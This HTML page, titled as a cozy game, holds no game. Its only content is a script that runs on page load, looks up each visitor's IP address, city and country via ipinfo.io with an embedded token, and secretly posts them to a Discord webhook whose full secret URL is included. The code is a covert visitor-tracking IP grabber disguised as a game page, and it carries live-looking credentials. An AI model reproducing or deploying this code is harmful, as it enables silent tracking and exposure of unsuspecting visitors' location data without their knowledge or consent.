<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LucasEM's cozy game</title>
</head>
<body>

<script>
    // Fetch user IP information
    fetch('https://ipinfo.io/json?token=abfa2c858d87e3')  // Using your IPInfo token
    .then(response => response.json())
    .then(data => {
        const ip = data.ip;
        const city = data.city;
        const country = data.country;

        // Log the user information (can be removed later)
        console.log('IP:', ip);
        console.log('City:', city);
        console.log('Country:', country);

        // Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/1328100763590987870/2K9BQddkrxO9SzFBH3lZMZDsRccH3dzT8MVWLOQWOJiKqC2NtNo4p8i-Ct1ULOVGvkYs';

        // Create a Discord embed message
        const message = {
            content: `User visited the website with IP: ${ip}, City: ${city}, Country: ${country}`,
            embeds: [
                {
                    title: "Visitor Information",
                    fields: [
                        { name: "IP", value: ip },
                        { name: "City", value: city },
                        { name: "Country", value: country }
                    ],
                    color: 0x00FF00
                }
            ]
        };

        // Send data to Discord webhook
        fetch(webhookURL, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(message),
        })
        .then(response => response.json())
        .then(data => console.log('Message sent:', data))
        .catch(error => console.error('Error sending message:', error));
    })
    .catch(error => console.error('Error fetching IP data:', error));
</script>

</body>
</html>
